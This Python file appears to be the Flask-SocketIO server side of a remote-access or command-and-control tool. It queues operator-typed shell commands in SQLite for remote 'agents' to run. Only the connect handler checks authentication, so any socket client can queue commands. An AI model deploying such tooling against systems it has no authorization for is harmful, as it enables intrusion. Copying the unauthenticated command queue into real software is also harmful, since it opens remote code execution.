from flask_login import current_user
from flask_socketio import SocketIO, join_room, leave_room, emit
from glycon.config import CONFIG
import sqlite3
from datetime import datetime
import json

def init_socket_handlers(socketio):
    @socketio.on('connect')
    def handle_connect():
        if current_user.is_authenticated:
            print(f"User {current_user.id} connected")

    @socketio.on('join_terminal')
    def handle_join_terminal(data):
        join_room(f"terminal_{data['agent_id']}")
        emit('terminal_status', {
            'status': 'Connected', 
            'connected': True,
            'agent_id': data['agent_id']
        }, room=f"terminal_{data['agent_id']}")

    @socketio.on('terminal_command')
    def handle_terminal_command(data):
        try:
            # Add command sequence tracking
            if not hasattr(handle_terminal_command, 'command_counter'):
                handle_terminal_command.command_counter = {}
            
            agent_id = data['agent_id']
            command = data['command']
            
            # Initialize counter for agent if not exists
            if agent_id not in handle_terminal_command.command_counter:
                handle_terminal_command.command_counter[agent_id] = 0
            
            # Increment command counter
            handle_terminal_command.command_counter[agent_id] += 1
            seq_id = handle_terminal_command.command_counter[agent_id]
            
            conn = sqlite3.connect(CONFIG.database)
            c = conn.cursor()
            
            task_data = {
                'cmd': command,
                'terminal': True,
                'seq_id': seq_id  # Add sequence ID
            }
            
            c.execute("INSERT INTO tasks VALUES (?, ?, ?, ?, ?, ?, ?)",
                    (None, agent_id, 'shell', json.dumps(task_data),
                    'pending', datetime.now().isoformat(), None))
            
            conn.commit()
            task_id = c.lastrowid
            conn.close()
            
            emit('terminal_output', {
                'agent_id': agent_id,
                'command': command,
                'output': f"[+] Command queued (Task ID: {task_id})",
                'task_id': task_id,
                'seq_id': seq_id  # Include sequence ID
            }, room=f"terminal_{agent_id}")
            
        except Exception as e:
            emit('terminal_output', {
                'agent_id': data['agent_id'],
                'error': f"Command submission failed: {str(e)}"
            }, room=f"terminal_{data['agent_id']}")